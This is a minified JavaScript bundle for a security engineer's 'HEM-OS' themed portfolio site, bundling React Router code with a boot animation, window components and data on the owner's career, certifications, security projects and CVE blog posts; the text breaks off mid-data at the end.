v,k=!1,y=null,S=null;t&&(v=l&&p.route.id?l[p.route.id]:void 0,y=p.route.errorElement||tm,c&&(u<0&&g===0?(dm("route-fallback"),k=!0,S=null):u===g&&(k=!0,S=p.route.hydrateFallbackElement||null)));let m=n.concat(i.slice(0,g+1)),d=()=>{let h;return v?h=y:k?h=S:p.route.Component?h=w.createElement(p.route.Component,null):p.route.element?h=p.route.element:h=f,w.createElement(am,{match:p,routeContext:{outlet:f,matches:m,isDataRoute:t!=null},children:h})};return t&&(p.route.ErrorBoundary||p.route.errorElement||g===0)?w.createElement(sm,{location:t.location,revalidation:t.revalidation,component:y,error:v,children:d(),routeContext:{outlet:null,matches:m,isDataRoute:!0}}):d()},null)}var Ld=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(Ld||{}),Cd=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(Cd||{});function im(e){let n=w.useContext(So);return n||se(!1),n}function om(e){let n=w.useContext(Yf);return n||se(!1),n}function lm(e){let n=w.useContext(Jn);return n||se(!1),n}function Pd(e){let n=lm(),t=n.matches[n.matches.length-1];return t.route.id||se(!1),t.route.id}function cm(){var e;let n=w.useContext(Td),t=om(),s=Pd();return n!==void 0?n:(e=t.errors)==null?void 0:e[s]}function um(){let{router:e}=im(Ld.UseNavigateStable),n=Pd(Cd.UseNavigateStable),t=w.useRef(!1);return Ed(()=>{t.current=!0}),w.useCallback(function(a,r){r===void 0&&(r={}),t.current&&(typeof a=="number"?e.navigate(a):e.navigate(a,ws({fromRouteId:n},r)))},[e,n])}const Ul={};function dm(e,n,t){Ul[e]||(Ul[e]=!0)}function pm(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function mn(e){se(!1)}function hm(e){let{basename:n="/",children:t=null,location:s,navigationType:a=xn.Pop,navigator:r,static:i=!1,future:l}=e;Ka()&&se(!1);let c=n.replace(/^\/*/,"/"),u=w.useMemo(()=>({basename:c,navigator:r,static:i,future:ws({v7_relativeSplatPath:!1},l)}),[c,l,r,i]);typeof s=="string"&&(s=Mt(s));let{pathname:f="/",search:p="",hash:g="",state:v=null,key:k="default"}=s,y=w.useMemo(()=>{let S=Sd(f,c);return S==null?null:{location:{pathname:S,search:p,hash:g,state:v,key:k},navigationType:a}},[c,f,p,g,v,k,a]);return y==null?null:w.createElement($a.Provider,{value:u},w.createElement(Ga.Provider,{children:t,value:y}))}function fm(e){let{children:n,location:t}=e;return Zf(Si(n),t)}new Promise(()=>{});function Si(e,n){n===void 0&&(n=[]);let t=[];return w.Children.forEach(e,(s,a)=>{if(!w.isValidElement(s))return;let r=[...n,a];if(s.type===w.Fragment){t.push.apply(t,Si(s.props.children,r));return}s.type!==mn&&se(!1),!s.props.index||!s.props.children||se(!1);let i={id:s.props.id||r.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(i.children=Si(s.props.children,r)),t.push(i)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function _i(e){return e===void 0&&(e=""),new URLSearchParams(typeof e=="string"||Array.isArray(e)||e instanceof URLSearchParams?e:Object.keys(e).reduce((n,t)=>{let s=e[t];return n.concat(Array.isArray(s)?s.map(a=>[t,a]):[[t,s]])},[]))}function mm(e,n){let t=_i(e);return n&&n.forEach((s,a)=>{t.has(a)||n.getAll(a).forEach(r=>{t.append(a,r)})}),t}const gm="6";try{window.__reactRouterVersion=gm}catch{}const ym="startTransition",Hl=op[ym];function vm(e){let{basename:n,children:t,future:s,window:a}=e,r=w.useRef();r.current==null&&(r.current=kf({window:a,v5Compat:!0}));let i=r.current,[l,c]=w.useState({action:i.action,location:i.location}),{v7_startTransition:u}=s||{},f=w.useCallback(p=>{u&&Hl?Hl(()=>c(p)):c(p)},[c,u]);return w.useLayoutEffect(()=>i.listen(f),[i,f]),w.useEffect(()=>pm(s),[s]),w.createElement(hm,{basename:n,children:t,location:l.location,navigationType:l.action,navigator:i,future:s})}var Wl;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Wl||(Wl={}));var Vl;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(Vl||(Vl={}));function wm(e){let n=w.useRef(_i(e)),t=w.useRef(!1),s=_o(),a=w.useMemo(()=>mm(s.search,t.current?null:n.current),[s.search]),r=Xf(),i=w.useCallback((l,c)=>{const u=_i(typeof l=="function"?l(a):l);t.current=!0,r("?"+u,c)},[r,a]);return[a,i]}const Hs=[{c:"ok",t:"[  OK  ] Reached target Boot Complete."},{c:"info",t:"[ INFO ] HEM-OS 1.7.0 — kernel 6.5.0-hardened"},{c:"ok",t:"[  OK  ] Mounted /home/hem (43 pentests, 18 posts, 12 certs)"},{c:"ok",t:"[  OK  ] Started Curiosity Daemon (curiosity-d)"},{c:"info",t:"[ INFO ] Loading vulnerabilities table … 9 entries"},{c:"warn",t:"[ WARN ] AMD-TSA microcode advisory found in queue"},{c:"ok",t:"[  OK  ] Started Display Manager"},{c:"em",t:"Welcome to HEM-OS."}];function km({onDone:e}){const[n,t]=w.useState(0);w.useEffect(()=>{let a=0;const r=setInterval(()=>{a+=1,t(a),a>=Hs.length&&(clearInterval(r),setTimeout(e,600))},220);return()=>clearInterval(r)},[e]);const s=Math.min(100,n/Hs.length*100);return o.jsxs("div",{className:"boot",children:[o.jsxs("div",{className:"logo",children:["HEM",o.jsx("span",{children:"-OS"})]}),o.jsxs("div",{className:"lines",children:[Hs.slice(0,n).map((a,r)=>o.jsx("div",{className:a.c,children:a.t},r)),n<Hs.length&&o.jsx("span",{className:"cursor"})]}),o.jsx("div",{className:"progress",children:o.jsx("div",{className:"fill",style:{width:s+"%"}})})]})}const xe={readme:{title:"README.txt",g:"g-readme",w:620,h:520},finder:{title:"Finder — About",g:"g-finder",w:760,h:560},notes:{title:"Notes — Writing",g:"g-notes",w:820,h:560},files:{title:"Files — Projects",g:"g-files",w:720,h:540},terminal:{title:"Terminal — hem@hemos",g:"g-term",w:720,h:480},timeline:{title:"Timeline — Experience",g:"g-time",w:700,h:560},mail:{title:"Mail — Contact",g:"g-mail",w:760,h:540},system:{title:"System Monitor",g:"g-system",w:680,h:540},games:{title:"Games — CVE Range",g:"g-games",w:900,h:600}},To=["finder","notes","files","terminal","timeline","mail","system","games"],Ad=["readme",...To],bm="hemos:bootSeen";function xm({activeApp:e,onSpotlight:n,actions:t}){var g;const[s,a]=w.useState(new Date),[r,i]=w.useState(null),l=w.useRef(null);w.useEffect(()=>{const v=setInterval(()=>a(new Date),3e4);return()=>clearInterval(v)},[]),w.useEffect(()=>{if(!r)return;const v=y=>{l.current&&!l.current.contains(y.target)&&i(null)},k=y=>{y.key==="Escape"&&i(null)};return window.addEventListener("mousedown",v),window.addEventListener("keydown",k),()=>{window.removeEventListener("mousedown",v),window.removeEventListener("keydown",k)}},[r]);const c=v=>()=>i(k=>k===v?null:v),u=v=>()=>{i(null),v&&v()},p={file:[{label:"New Terminal",hint:"term",run:()=>{var v;return(v=t==null?void 0:t.launch)==null?void 0:v.call(t,"terminal")}},{label:"New Notes window",hint:"notes",run:()=>{var v;return(v=t==null?void 0:t.launch)==null?void 0:v.call(t,"notes")}},{label:"Spotlight…",hint:"⌘K",run:n},{sep:!0},{label:"Replay Boot",hint:"?boot=1",run:()=>{try{localStorage.removeItem(bm)}catch{}window.location.assign("/?boot=1")}},{label:"Close Active Window",hint:"✕",run:t==null?void 0:t.closeActive,disabled:!(t!=null&&t.hasFocus)}],edit:[{label:"Search…",hint:"⌘K",run:n},{label:"Copy Email",run:()=>{var v;return(v=navigator.clipboard)==null?void 0:v.writeText("hemparekhportfolio@gmail.com")}},{label:"Copy Site URL",run:()=>{var v;return(v=navigator.clipboard)==null?void 0:v.writeText(window.location.href)}}],view:[{label:"About HEM-OS",run:()=>{var v;return(v=t==null?void 0:t.launch)==null?void 0:v.call(t,"readme")}},{label:"Show System Monitor",run:()=>{var v;return(v=t==null?void 0:t.launch)==null?void 0:v.call(t,"system")}},{sep:!0},{label:"Minimize All Windows",run:t==null?void 0:t.minimizeAll,disabled:!(t!=null&&t.hasOpen)},{label:"Close All Windows",run:t==null?void 0:t.closeAll,disabled:!(t!=null&&t.hasOpen)}]};return o.jsxs("div",{className:"tb",ref:l,children:[o.jsx("span",{className:"it brand",children:"⌘ HEM-OS"}),o.jsx("span",{className:"it",children:e&&((g=xe[e])==null?void 0:g.title)||"Desktop"}),["file","edit","view"].map(v=>o.jsxs("span",{className:`it tb-menu ${r===v?"open":""}`,onClick:c(v),children:[v[0].toUpperCase()+v.slice(1),r===v&&o.jsx("div",{className:"tb-menu-pop",onClick:k=>k.stopPropagation(),children:p[v].map((k,y)=>k.sep?o.jsx("div",{className:"tb-menu-sep"},y):o.jsxs("button",{type:"button",className:"tb-menu-item",disabled:k.disabled,onClick:u(k.run),children:[o.jsx("span",{children:k.label}),k.hint&&o.jsx("span",{className:"tb-menu-hint",children:k.hint})]},y))})]},v)),o.jsxs("div",{className:"r",children:[o.jsxs("span",{children:[o.jsx("span",{className:"dot"}),"online"]}),o.jsx("span",{style:{cursor:"pointer"},onClick:n,children:"⌘K spotlight"}),o.jsx("span",{style:{color:"var(--ink)"},children:s.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})})]})]})}function Sm({onLaunch:e,openApps:n}){return o.jsx("div",{className:"dk",children:To.map(t=>{const s=xe[t],a=s.title.split(" ")[0][0],r=s.title.split("—")[0].trim();return o.jsxs("div",{className:"ic","data-app":t,onClick:()=>e(t),children:[o.jsx("div",{className:`gly ${s.g}`,children:a}),o.jsx("div",{className:"dock-label",children:r}),o.jsx("div",{className:"lbl",children:r}),n.includes(t)&&o.jsx("div",{className:"run"})]},t)})})}const $l=420;function xr(e,n){const t=n.x+n.w/2,s=n.y+n.h/2,a={tx:0,ty:window.innerHeight-s};if(typeof document>"u")return a;const r=document.querySelector(`.dk .ic[data-app="${e}"]`);if(!r)return a;const i=r.getBoundingClientRect();return{tx:i.left+i.width/2-t,ty:i.top+i.height/2-s}}function _m({win:e,focused:n,onClose:t,onMinimize:s,onToggleMaximize:a,onFocus:r,onMove:i,onResize:l,children:c}){const[u,f]=w.useState(null),[p,g]=w.useState(null),[v,k]=w.useState(e.minimized?"minimized":"visible"),[y,S]=w.useState(null);w.useEffect(()=>{e.minimized||(S(xr(e.app,e)),k("opening"))},[]),w.useEffect(()=>{if(!u&&!p)return;const b=C=>{const A=C.touches?C.touches[0].clientX:C.clientX,I=C.touches?C.touches[0].clientY:C.clientY;u?i(e.id,Math.max(0,u.wx+(A-u.x)),Math.max(30,u.wy+(I-u.y))):p&&l(e.id,Math.max(360,p.ww+(A-p.x)),Math.max(220,p.wh+(I-p.y)))},E=()=>{f(null),g(null)};return window.addEventListener("mousemove",b),window.addEventListener("mouseup",E),window.addEventListener("touchmove",b),window.addEventListener("touchend",E),()=>{window.removeEventListener("mousemove",b),window.removeEventListener("mouseup",E),window.removeEventListener("touchmove",b),window.removeEventListener("touchend",E)}},[u,p,e.id,i,l]),w.useEffect(()=>{e.minimized&&v==="visible"?(S(xr(e.app,e)),k("minimizing")):!e.minimized&&v==="minimized"&&(S(xr(e.app,e)),k("restoring"))},[e.minimized]),w.useEffect(()=>{if(v==="minimizing"){const b=setTimeout(()=>k("minimized"),$l);return()=>clearTimeout(b)}if(v==="restoring"||v==="opening"){const b=setTimeout(()=>{k("visible"),S(null)},$l);return()=>clearTimeout(b)}},[v]);const m=b=>{const E=b.touches?b.touches[0].clientX:b.clientX,C=b.touches?b.touches[0].clientY:b.clientY;f({x:E,y:C,wx:e.x,wy:e.y}),r(e.id)},d=b=>{b.stopPropagation();const E=b.touches?b.touches[0].clientX:b.clientX,C=b.touches?b.touches[0].clientY:b.clientY;g({x:E,y:C,ww:e.w,wh:e.h}),r(e.id)},h={left:e.maximized?0:e.x,top:e.maximized?30:e.y,width:e.maximized?"100vw":e.w,height:e.maximized?"calc(100vh - 30px - 80px)":e.h,zIndex:n?30:10+(e.z||0)};y&&(v==="minimizing"||v==="restoring"||v==="opening")&&(h["--genie-tx"]=`${y.tx}px`,h["--genie-ty"]=`${y.ty}px`);const x=v==="minimized"?"mn":v==="minimizing"?"minimizing":v==="restoring"?"restoring":v==="opening"?"opening":"";return o.jsxs("div",{className:`win ${n?"fc":""} ${x}`,style:h,onMouseDown:()=>r(e.id),children:[o.jsxs("div",{className:`tt ${u?"gr":""}`,onMouseDown:m,onTouchStart:m,onDoubleClick:()=>a(e.id),children:[o.jsx("div",{className:"ti",children:xe[e.app].title}),o.jsxs("div",{className:"tr",children:[o.jsxs("button",{type:"button",className:"tl mi",title:"Minimize",onMouseDown:b=>b.stopPropagation(),onClick:b=>{b.stopPropagation(),s(e.id)},children:[o.jsx("span",{"aria-hidden":"true",children:"—"}),o.jsx("span",{className:"visually-hidden",children:"Minimize"})]}),o.jsxs("button",{type:"button",className:"tl mx",title:e.maximized?"Restore":"Maximize",onMouseDown:b=>b.stopPropagation(),onClick:b=>{b.stopPropagation(),a(e.id)},children:[o.jsx("span",{"aria-hidden":"true",children:e.maximized?"❐":"□"}),o.jsx("span",{className:"visually-hidden",children:e.maximized?"Restore":"Maximize"})]}),o.jsxs("button",{type:"button",className:"tl cl",title:"Close",onMouseDown:b=>b.stopPropagation(),onClick:b=>{b.stopPropagation(),t(e.id)},children:[o.jsx("span",{"aria-hidden":"true",children:"×"}),o.jsx("span",{className:"visually-hidden",children:"Close"})]})]})]}),o.jsx("div",{className:"wb",children:c}),!e.maximized&&o.jsx("div",{className:"rs",onMouseDown:d,onTouchStart:d})]})}const Tm=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],Em={text:"I’m Hem Parekh, a Security and Privacy Engineer at Amazon working on Devices & Services. I run privacy threat modeling and design reviews, lead incident response for data exposure events, and build internal tooling to automate privacy-by-design controls across product teams. On the side, I build autonomous security tools — including FORGE, a multi-agent pentesting platform, and ShellScribe, an offline security analysis CLI. I blend engineering discipline with a hacker’s curiosity, and I write up what I find so other defenders can move faster."},Gl=[{range:"Mar 2024 - Present",role:"Security and Privacy Engineer",org:"Amazon",desc:"Leading privacy threat modeling and design reviews for Devices & Services features; conducting end-to-end privacy incident response; building MCP-powered tooling to automate privacy review workflows and enforce privacy-by-design guardrails; translating GDPR/CCPA requirements into actionable technical controls across product and engineering teams."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],Nn=[{title:"FORGE",description:"A fully autonomous multi-agent pentesting platform. The Strategic Brain handles semantic app modeling, LLM-powered campaign planning, and attack surface analysis. The Tactical Swarm runs ReAct-driven agents (recon, probe, deep exploit, evasion, fuzzing) that reason and adapt mid-execution using HTTP requests and Docker-hosted security tools (sqlmap, ffuf, nikto). Ships a Live Exploitation Engine: generates weaponized exploit scripts, executes them in isolated Docker containers against real targets, and delivers LLM-judged verdicts (confirmed / failed / inconclusive) with user override. Discovered 226 vulnerabilities in a real-world CLI project during initial testing. Full React dashboard with live WebSocket streaming, CLI tool, and human-in-the-loop gates throughout.",href:"https://github.com/Hem1700/forge",tags:["Security","AI","Automation"]},{title:"Raven",description:"An AI-powered offensive security research platform combining autonomous exploit development with intelligent binary analysis. Raven uses a multi-agent system (Scout, Analyst, Weaponizer, Validator) to automate the full security research lifecycle — from binary recon and vulnerability discovery to exploit generation and validation. Built for CTF players, red teamers, and security researchers.",href:"https://github.com/Hem1700/raven",tags:["Security","AI","Toolkit"]},{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]},{title:"ShellScribe",description:"Offline-first, policy-gated security testing framework with modular plugins, reproducible runs, and evidence-bound reporting for authorized research workflows.",href:"https://github.com/Hem1700/shellscribe",tags:["Security","Toolkit","Automation"]}],Nd=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],me=[{slug:"llm_assisted_binary_diffing_blog",title:"LLM-Assisted Binary Diffing: Finding 1-Days Before PoCs Drop",href:"/blog/llm_assisted_binary_diffing_blog",excerpt:"When a vendor ships a security patch, the binary tells the story. LLMs compress patch diffing from days to hours; this post walks the full pipeline from acquisition to validation.",date:"February 8, 2026",readTime:"8 min read",category:"Research Papers"},{slug:"llm_multistage_attacks_technical_breakdown_full",title:"On the Feasibility of Using LLMs to Execute Multistage Network Attacks – A Technical Breakdown",href:"/blog/llm_multistage_attacks_technical_breakdown_full",excerpt:"A technical breakdown of why LLMs struggle with multistage network attacks and how the Incalmo framework changes outcomes for autonomous red teaming.",date:"January 20, 2026",readTime:"25 min read",category:"Research Papers"},{slug:"villager_inside_out",title:"Villager, Inside Out: FastAPI control plane + LLM task graph + MCP tool runner (with code)",href:"/blog/villager_inside_out",excerpt:"A defender-focused teardown of the villager agent stack: FastAPI control plane, task-graph orchestration, MCP tool execution, and the risk model around exposed tools.",date:"January 6, 2026",readTime:"12 min read",category:"Research Papers"},{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read",category:"Research Papers"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read",category:"CVEs/Libraries"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read",category:"Research Papers"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read",category:"Research Papers"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read",category:"Research Papers"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read",category:"Research Papers"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read",category:"CVEs/Libraries"}],re={name:"Hem Parekh",role:"Security and Privacy Engineer",current:"Amazon",location:"United States",tz:"PT",email:"hemparekhportfolio@gmail.com"},ra=[{k:"BUILD:",v:"tools that ship, not slides."},{k:"WRITE:",v:"defenders move faster when findings are public."},{k:"HUNT:",v:"every environment tells a story — read it before reacting."},{k:"LEARN:",v:"curiosity-d runs continuously."}],Lm=[{n:String(Nn.length),l:"projects"},{n:String(me.length),l:"writeups"},{n:String(Nd.length),l:"certs"},{n:"1",l:"patent"}],Md=["Building MCP-powered privacy review tooling at Amazon","Reverse-engineering CVE-2022-26318 (WatchGuard Firebox) for the next post","Iterating on FORGE — autonomous multi-agent pentesting","Reading: AMD-TSA microcode advisory + transient scheduler attacks"],Ct={FORGE:{code:"FRG",status:"ACTIVE",metric:"226 vulns surfaced",stack:["React","Python","FastAPI","Docker","WebSocket"]},Raven:{code:"RVN",status:"ACTIVE",metric:"multi-agent platform",stack:["Python","LLM","Binary RE"]},"Phish Analyzer Tool":{code:"SITA",status:"PATENTED",metric:"patented 